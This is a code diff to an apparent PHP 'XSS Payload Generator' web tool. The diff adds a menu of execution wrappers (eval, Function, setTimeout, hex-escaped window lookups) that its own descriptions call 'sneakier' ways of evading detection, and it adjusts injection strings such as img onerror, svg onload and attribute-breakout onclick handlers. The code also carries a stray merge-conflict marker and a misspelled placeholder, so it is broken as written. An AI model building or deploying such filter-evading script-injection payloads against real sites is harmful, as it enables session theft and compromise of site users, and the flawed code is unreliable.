@@ -70,34 +70,88 @@
       "code" => "{payload}"
     ],
     [
-      "name" => "String eval",
-      "desc" => "Pass the payload as a string into eval()",
-      "code" => "eval('{payload}')"
+      "name" => "Pass as string",
+      "desc" => "Pass the payload as a string into an execution method",
+      "code" => "'{payload}'"
     ],
     [
       "name" => "Base64 (atob())",
-      "desc" => "Base64 encode and execute using eval()",
-      "code" => "eval(atob('{payloadb64}'))"
+      "desc" => "Base64 encode",
+      "code" => "atob('{payloadb64}')"
     ],
     [
       "name" => "Reverse",
       "desc" => "Reverse payload string and execute using eval()",
-      "code" => "eval('{payloadrev}'.split('').reverse().join(''))"
+      "code" => "'{payloadrev}'.split('').reverse().join('')"
     ],
     [
       "name" => "String.fromCharCode()",
       "desc" => "Build payload string one char at a time using the ordinal value",
-      "code" => "eval({payloadchr})"
+      "code" => "{payloadchr}"
     ],
     [
       "name" => "Character hex codes",
       "desc" => "Construct the payload using hex value of each character",
-      "code" => "eval('{payloadhex}')"
+      "code" => "'{payloadhex}'"
     ],
     [
       "name" => "JSF*ck",
       "desc" => "Encode payload using only the characters []()!+",
-      "code" => "eval({payloadjsf})"
+      "code" => "{payloadjsf}"
+    ]
+  ];
+
+  $aExecution = [
+    [
+      "name" => "None",
+      "desc" => "No execution required",
+      "code" => "{obfuscated}"
+    ],
+    [
+      "name" => "eval()",
+      "desc" => "Pass string to eval() function",
+      "code" => "eval({obfuscated})"
+    ],
+    [
+      "name" => "window['eval']()",
+      "desc" => "Slightly sneakier way of calling eval()",
+      "code" => "window['eval']({obfuscated})"
+    ],
+    [
+      "name" => "window['\\x65\\x76\\x61\\x6c']()",
+      "desc" => "Even sneakier way of calling eval()",
+      "code" => "window['\\x65\\x76\\x61\\x6c']({obfuscated})"
+    ],
+    [
+      "name" => "Function()()",
+      "desc" => "Declare and execute an anonymous function",
+      "code" => "Function({obfuscated})()"
+    ],
+    [
+      "name" => "window['Function']()()",
+      "desc" => "Slightly sneakier way of creating a new anonymous function",
+      "code" => "window['Function']({obfsucated})()"
+    ],
+    [
+      "name" => "window['\\x46\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e']()()",
+      "desc" => "Even sneakier way of creating a new anonymous function",
+      "code" => "window['\\x46\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e']({obfuscated})()"
+    ],
+    [
+      "name" => "setTimeout()",
+      "desc" => "Pass code string to the setTimeout() function",
+      "code" => "setTimeout({obfuscated},0)"
+    ],
+    [
+      "name" => "window['setTimeout']()",
+      "desc" => "Slightly sneakier way of calling the setTimeout() function",
+      "code" => "window['setTimeout']({obfuscated},0)"
+    ],
+    [
+      "name" => "window['\\x73\\x65\\x74\\x54\\x69\\x6d\\x65\\x6f\\x75\\x74']()",
+      "desc" => "Even sneakier way of calling the setTimeout() function",
+      "code" => "window['\\x73\\x65\\x74\\x54\\x69\\x6d\\x65\\x6f\\x75\\x74']({obfuscated},0)"
+>>>>>>> b8b866e
     ]
   ];
   
@@ -130,22 +184,22 @@
     [
       "name" => "img element onerror",
       "desc" => "Inject an invalid <img> element with the payload within onerror",
-      "code" => "<img src=x onerror={payload}/>"
+      "code" => "<img src=x onerror={payload} />"
     ],
     [
       "name" => "SVG element",
       "desc" => "Inject an SVG element containing the payload within onload",
-      "code" => "<svg onload={payload}/>"
+      "code" => "<svg onload={payload} />"
     ],
     [
       "name" => "Element onclick",
       "desc" => "Break out of an element attribute and add an onclick event",
-      "code" => "'\" onclick={payload}>"
+      "code" => "'\" onclick={payload} >"
     ],
     [
       "name" => "Element onmouseover",
       "desc"  => "Break out of an element attribute and add an onmouseover event",
-      "code" => "'\" onmouseover={payload}>"
+      "code" => "'\" onmouseover={payload} >"
     ]
   ];
   
@@ -522,8 +576,8 @@
 
   // Logic for generating a payload
   function generatePayload( $form ){
-    global $aPayloads, $aObfuscation, $aInjections;
-    $required = ['payloadid','injectionid','obfuscationid'];
+    global $aPayloads, $aObfuscation, $aExecution, $aInjections;
+    $required = ['payloadid','injectionid','obfuscationid','executionid'];
     foreach( $required as $item ){
       if( !in_array( $item, array_keys( $form ) ) ) return $item." not provided";
     }
@@ -573,6 +627,13 @@
     }
     $rtn['obfuscated'] = $code;
 
+    // Add into execution method
+    if( !in_array( $form['executionid'], array_keys( $aExecution ) ) ) $form['executionid'] = 0;
+    $execution = $aExecution[$form['executionid']];
+    $rtn['meta']['execution'] = $execution;
+    $code = str_replace( '{obfuscated}', $rtn['obfuscated'], $execution['code'] );
+    $rtn['execute'] = $code;
+
     // Insert into injection string
     if( !in_array( $form['injectionid'], array_keys( $aInjections ) ) ) $form['injectionid'] = 0;
     $injection = $aInjections[$form['injectionid']];
@@ -598,7 +659,7 @@
 <title>XSS Payload Generator</title>
 <script>
 function createPayload(){
-  ids = 'payloadid,obfuscationid,injectionid'.split(',');
+  ids = 'payloadid,obfuscationid,executionid,injectionid'.split(',');
   var args = '';
   opts = [];
   for( var i=0; i<ids.length; i++ ){
@@ -642,6 +703,7 @@ function createPayload(){
       document.getElementById('payload_desc').innerText = data['meta']['payload']['desc'];
       document.getElementById('injection_desc').innerText = data['meta']['injection']['desc'];
       document.getElementById('obfuscation_desc').innerText = data['meta']['obfuscation']['desc'];
+      document.getElementById('execution_desc').innerText = data['meta']['execution']['desc'];
     }
   }
   x.open('GET',url);
@@ -733,6 +795,17 @@ window.onload = initForm;
 ?>
     </select>
     <div id="obfuscation_desc" class="desc"></div>
+  </div>
+  <div>
+    <label for="executionid">Execution</label>
+    <select id="executionid">
+<?php
+  foreach( $aExecution as $id => $item ){
+    echo "      <option value=\"$id\">" . $item["name"] . "</option>\n";
+  }
+?>
+    </select>
+    <div id="execution_desc" class="desc"></div>
   </div>
   <div>
     <label for="injectionid">Injection type</label>
